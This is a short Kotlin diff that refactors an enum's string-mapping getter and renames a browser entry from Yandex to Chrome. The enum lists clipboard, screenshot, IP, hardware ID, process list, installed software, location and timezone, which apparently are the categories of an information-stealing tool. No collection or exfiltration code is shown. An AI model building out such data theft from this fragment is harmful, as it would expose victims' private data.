@@ -12,22 +12,21 @@ enum class TypeData {
     SYSTEM_INSTALLED_SOFTWARE,
     SYSTEM_LOCATION,
     SYSTEM_TIMEZONE,
-    BROWSER_YANDEX;
+    BROWSER_CHROME;
 
     val stringType: String
         get() {
-            val type: String
-            when (this) {
-                SYSTEM_CLIPBOARD -> type = "Clipboard"
-                SYSTEM_SCREEN -> type = "Screenshot"
-                SYSTEM_IP -> type = "IP"
-                SYSTEM_HWID -> type = "HWID"
-                SYSTEM_INFORMATION_JAVA -> type = "SystemInformation"
-                SYSTEM_PROCESS_LIST -> type = "ProcessList"
-                SYSTEM_INSTALLED_SOFTWARE -> type = "DownloadedSoftware"
-                SYSTEM_LOCATION -> type = "Location"
-                SYSTEM_TIMEZONE -> type = "TimeZone"
-                else -> type = "Unknown data type_${Random().nextLong()}"
+            val type: String = when (this) {
+                SYSTEM_CLIPBOARD -> "Clipboard"
+                SYSTEM_SCREEN -> "Screenshot"
+                SYSTEM_IP -> "IP"
+                SYSTEM_HWID -> "HWID"
+                SYSTEM_INFORMATION_JAVA -> "SystemInformation"
+                SYSTEM_PROCESS_LIST -> "ProcessList"
+                SYSTEM_INSTALLED_SOFTWARE -> "DownloadedSoftware"
+                SYSTEM_LOCATION -> "Location"
+                SYSTEM_TIMEZONE -> "TimeZone"
+                else -> "Unknown data type_${Random().nextLong()}"
             }
 
             return type
